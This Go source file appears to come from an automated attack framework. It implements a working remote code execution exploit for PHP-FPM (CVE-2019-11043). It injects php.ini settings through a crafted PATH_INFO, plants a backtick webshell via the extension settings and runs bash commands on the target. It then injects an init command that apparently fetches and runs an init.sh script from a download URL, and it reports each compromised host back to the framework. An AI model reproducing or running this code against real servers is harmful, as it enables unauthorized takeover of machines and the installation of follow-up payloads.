package php

import (
	"fmt"
	"github.com/cbot/attack"
	mhttp "github.com/cbot/proto/http"
	"github.com/cbot/targets/source"
	"log"
	"net/http"
	"strings"
	"time"
)

const (
	UserAgent            = "GOClient"
	PosOffset            = 34
	SettingEnableRetries = 50
	MinQSL               = 1500
	MaxQSL               = 1950
	QSLDetectStep        = 5
	MaxQSLDetectDelta    = 10
	MaxQSLCandidates     = 10
	MaxPisosLength       = 256
	BreakingPayload      = "/PHP\nis_the_shittiest_lang.php"
	Timeout = 10000

	successPattern = "uid="

	basePath =  "/index.php"
	PHPCVE2019_11043AttackName = "PHP_RCE_CVE_2019_11043_Attack"
	PHPCVE2019_11043AttackType = "PHP_RCE_CVE_2019_11043_Attack"
)

var chain = []string{
	"short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?=`\"",
	"extension=\"$_GET[a]`?>\"",
}

type PHPAttackCVE2019_11043 struct {

	attackTasks *attack.AttackTasks
}

func NewPHPAttackCVE2019_11043(attackTasks *attack.AttackTasks) *PHPAttackCVE2019_11043 {

	return &PHPAttackCVE2019_11043 {
		attackTasks: attackTasks,
	}
}

func makeCmd(cmd string) string {
	return fmt.Sprintf(`a=bash+-c+'%s'&`,strings.Replace(cmd," ","+",-1))
}
func makePathInfo(phpValue string) string {

	pi := "/PHP_VALUE\n" + phpValue
	if len(pi) < PosOffset {
		return pi + strings.Repeat(";", PosOffset-len(pi))
	}

	return pi
}

func setSetting(requester *Requester, params *AttackParams, setting string, tries int) error {

	log.Printf("Trying to set %#v...", setting)
	for i := 0; i < tries; i++ {
		if _, _, err := setSettingSingle(requester, params, setting, ""); err != nil {
			return fmt.Errorf("error while setting %#v: %v", setting, err)
		}
	}
	return nil
}

func setSettingSingle(requester *Requester, params *AttackParams, setting, queryStringPrefix string) (*http.Response, []byte, error) {
	payload := makePathInfo(setting)
	return requester.RequestWithQueryStringPrefix(payload, params, queryStringPrefix)
}

func isPhp(host string,port int,isSSL bool ) bool {

	client := mhttp.NewHttpClient(host,port,isSSL,Timeout)

	request := mhttp.NewHttpRequest("get",basePath)

	if res,err := client.Send(request);err!=nil {

		return false
	}else {

		return res.GetStatusCode() == 200
	}

}

func (pa *PHPAttackCVE2019_11043) Name() string {

	return PHPCVE2019_11043AttackName
}

func (pa *PHPAttackCVE2019_11043) DefaultPort() int {

	return 80
}

func (pa *PHPAttackCVE2019_11043) DefaultProto() string {

	return "http"
}

func (pa *PHPAttackCVE2019_11043) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, PHPCVE2019_11043AttackType) {

			return true
		}
	}

	return false
}

func (pa *PHPAttackCVE2019_11043) doCheck(requester *Requester, params *AttackParams,cmd string) (string,string,bool) {

	log.Printf("Performing attack check using php.ini settings...")

	tm := time.NewTicker(1*time.Minute)

	defer tm.Stop()

	newCmd := makeCmd("id;"+cmd)

	for {

		select {

		case <-tm.C:
			log.Printf("check timeout:1m\n")
			return "","",false

		default:

			for _, payload := range chain {

				_, body, err := setSettingSingle(requester, params, payload,newCmd)
				if err != nil {
					return "","",false

				}

				content := string(body)

				if strings.Contains(content,successPattern){

					return payload,content,true
				}

			}
		}

	}


}



func (pa *PHPAttackCVE2019_11043) runAttack(ip string, port int) bool {

	var err error
	proto := "http"
	isSSL := false
	if port == 443 {
		isSSL = true
		proto = "https"
	}

	if !isPhp(ip,port,isSSL) {

		return false
	}

	url := fmt.Sprintf("%s://%s:%d%s",proto,ip,port,basePath)

	m:= Methods["session.auto_start"]
	requester, err := NewRequester(url)
	if err != nil {
		log.Printf("Failed to create requester: %v\n", err)
		return false
	}

	params, err := Detect(requester, m)
	if err != nil {

		log.Printf("Detect php bugs failed:%v\n",err)
		return false
	}

	if !params.Complete() {

		log.Printf("Detect() returned incomplete attack params, something gone wrong\n")
		return false
	}

	log.Printf("Detect() returned attack params: %s <-- REMEMBER THIS", params)

	initUrl := pa.attackTasks.DownloadInitUrl(ip, port,PHPCVE2019_11043AttackType, "init.sh")
	cmd := pa.attackTasks.InitCmdForLinux(initUrl,PHPCVE2019_11043AttackType)

	_,content,ok := pa.doCheck(requester,params,cmd)

	if ok {

		//attack ok
		//submit ok,so attack is ok
		ap := &attack.AttackProcess{
			TengoObj: attack.TengoObj{},
			IP:       ip,
			Host:     ip,
			Port:     port,
			Proto:    "http",
			App:      "php",
			OS:       "linux",
			Name:     PHPCVE2019_11043AttackName,
			Type:     PHPCVE2019_11043AttackType,
			Status:   0,
			Payload:  "id",
			Result:   content,
			Details:  fmt.Sprintf("qsl=%d,psl=%d",params.QueryStringLength,params.PisosLength),
		}

		pa.PubProcess(ap)


		//log.Printf("Performing attack using php.ini settings...")


		//setSettingSingle(requester, params, payload, newCmd)


		return true
	}

	return false
}


func (pa *PHPAttackCVE2019_11043) Run(target source.Target) error {

	defer pa.attackTasks.PubUnSyn()

	ip := target.IP()
	port := target.Port()

	if port <= 0 {

		port = pa.DefaultPort()
	}

	if ip == "" || port <= 0 {
		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
	}

	pa.runAttack(ip,port)

	return nil
}

func (pa *PHPAttackCVE2019_11043) PubProcess(process *attack.AttackProcess) {

	pa.attackTasks.PubAttackProcess(process)

}



